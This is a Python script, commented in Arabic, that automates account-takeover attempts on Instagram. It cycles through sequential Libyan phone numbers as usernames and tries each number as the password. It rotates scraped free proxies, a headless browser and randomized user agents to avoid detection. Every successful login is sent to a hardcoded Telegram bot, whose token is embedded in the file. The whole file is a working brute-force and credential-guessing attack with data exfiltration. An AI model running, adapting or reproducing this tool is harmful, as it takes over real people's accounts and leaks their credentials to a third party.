# insta_proxy_tester.py
# -*- coding: utf-8 -*-
import sys
import io
sys.stdout = io.TextIOWrapper(sys.stdout.buffer, encoding='utf-8')

import time
import random
from selenium import webdriver
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
import chromedriver_autoinstaller
import requests
import traceback
from user_agent import generate_user_agent
from bs4 import BeautifulSoup

# --- إعدادات بوت التيليجرام ---
BOT_TOKEN = "1936058114:AAHm19u1R6lv_vShGio-MIo4Z0rjVUoew_U"
CHAT_ID = "1148797883"

def send_telegram_message(message):
    """يرسل رسالة إلى بوت التيليجرام"""
    try:
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
        payload = {'chat_id': CHAT_ID, 'text': message, 'parse_mode': 'Markdown'}
        requests.post(url, json=payload, timeout=10)
        print("📬 تم إرسال التقرير إلى بوت التيليجرام.")
    except Exception as e:
        print(f"❌ فشل إرسال رسالة تيليجرام: {e}")

# --- الإعدادات الرئيسية للاختبار ---
START_NUMBER = 921234567 

# --- دالة جلب قائمة بروكسيات مجانية ---
def get_free_proxies():
    """يجلب قائمة بروكسيات مجانية من موقع free-proxy-list.net"""
    proxies = []
    try:
        print("🌐 جارٍ جلب قائمة بروكسيات مجانية...")
        url = "https://free-proxy-list.net/"
        response = requests.get(url, headers={'User-Agent': generate_user_agent()}, timeout=20)
        soup = BeautifulSoup(response.content, 'html.parser')
        table = soup.find('table')
        for row in table.tbody.find_all('tr'):
            if row.find_all('td')[6].text == 'yes' and row.find_all('td')[4].text == 'anonymous':
                ip = row.find_all('td')[0].text
                port = row.find_all('td')[1].text
                proxies.append(f"{ip}:{port}")
        print(f"✅ تم العثور على {len(proxies)} بروكسي محتمل.")
        random.shuffle(proxies)
        return proxies
    except Exception as e:
        print(f"❌ فشل جلب البروكسيات: {e}")
        return []

# --- تهيئة المتصفح مع بروكسي ---
def initialize_browser_with_proxy(proxy):
    """يقوم بتهيئة متصفح جديد مع بروكسي محدد"""
    print(f"\n🚀 تهيئة متصفح جديد مع البروكسي: {proxy}")
    
    # في بيئة Railway، نحتاج إلى تحديد مسارات Chrome يدوياً
    chrome_options = Options()
    chrome_options.add_argument("--no-sandbox")
    chrome_options.add_argument("--disable-dev-shm-usage")
    chrome_options.add_argument("--headless") # التشغيل بدون واجهة رسومية (ضروري للسيرفرات)
    chrome_options.add_argument(f'user-agent={generate_user_agent()}')
    chrome_options.add_argument(f'--proxy-server=http://{proxy}')
    
    # لا نستخدم chromedriver-autoinstaller على السيرفر
    # Railway يوفر chromedriver متوافق
    driver = webdriver.Chrome(options=chrome_options)
    
    driver.set_page_load_timeout(40) # زيادة المهلة قليلاً للسيرفرات
    print("✅ المتصفح جاهز (بشكل مبدئي).")
    return driver

# --- دالة محاولة تسجيل الدخول (مع معالج الكوكيز) ---
def attempt_login(driver, username, password):
    """يحاول تسجيل الدخول مع التعامل مع نافذة الكوكيز أولاً."""
    try:
        print(f"   - المحاولة باستخدام: اليوزر=`{username}`, الباسورد=`{password}`")
        wait = WebDriverWait(driver, 20)
        driver.get("https://www.instagram.com/accounts/login/")
        
        try:
            cookie_wait = WebDriverWait(driver, 7)
            cookie_button = cookie_wait.until(EC.element_to_be_clickable((By.XPATH, "//button[contains(text(), 'Accept') or contains(text(), 'Allow')]")))
            print("   🍪 تم العثور على نافذة الكوكيز. جارٍ الضغط على زر القبول...")
            cookie_button.click()
            time.sleep(2)
        except Exception:
            print("   🍪 لم تظهر نافذة الكوكيز.")
            pass

        print("   📝 جارٍ البحث عن حقول تسجيل الدخول...")
        username_input = wait.until(EC.presence_of_element_located((By.NAME, "username")))
        password_input = driver.find_element(By.NAME, "password")
        
        print("   ⌨️ جارٍ إدخال البيانات...")
        username_input.send_keys(username)
        time.sleep(random.uniform(0.5, 1.5))
        password_input.send_keys(password)
        time.sleep(1)
        
        login_button = driver.find_element(By.XPATH, "//button[@type='submit']")
        login_button.click()
        
        time.sleep(5)
        
        if "login" not in driver.current_url:
            return True
        
        print("     ... فشل.")
        return False
    except Exception as e:
        print(f"     ... فشل (خطأ في البروكسي أو مهلة الانتظار أو لم يتم العثور على العناصر).")
        return False

# --- الحلقة الرئيسية للبرنامج ---
if __name__ == "__main__":
    current_number = START_NUMBER
    while True:
        proxies = get_free_proxies()
        if not proxies:
            print("لم يتم العثور على بروكسيات. سنتوقف لمدة 5 دقائق ونحاول مرة أخرى.")
            time.sleep(300)
            continue

        phone_number_str = str(current_number)
        username_to_use = "218" + phone_number_str
        passwords_to_try = ["0" + phone_number_str, phone_number_str]
        
        print(f"\n=============================================")
        print(f"🎯 بدأ اختبار الرقم: {phone_number_str}")
        print(f"=============================================")
        
        found = False
        for proxy in proxies:
            driver = None
            try:
                driver = initialize_browser_with_proxy(proxy)
                for password in passwords_to_try:
                    if attempt_login(driver, username_to_use, password):
                        success_message = (f"🎉 *SUCCESS (Railway)* 🎉\n\n*Username:*\n`{username_to_use}`\n\n*Password:*\n`{password}`\n\n*Via Proxy:*\n`{proxy}`")
                        send_telegram_message(success_message)
                        found = True
                        break
                if found:
                    break
            except Exception as e:
                print(f"❌ البروكسي {proxy} فشل بشكل كامل.")
            finally:
                if driver:
                    driver.quit()
        
        if found:
            print("🎉🎉🎉 تم العثور على حساب! ننتقل للرقم التالي بعد دقيقة.")
            time.sleep(60)
        else:
            print(f"--- لم تنجح أي محاولة للرقم {phone_number_str} مع كل البروكسيات المتاحة.")

        current_number += 1
        sleep_time = random.randint(10, 20)
        print(f"⏳ سيتم البدء في اختبار الرقم التالي بعد {sleep_time} ثانية...")
        time.sleep(sleep_time)
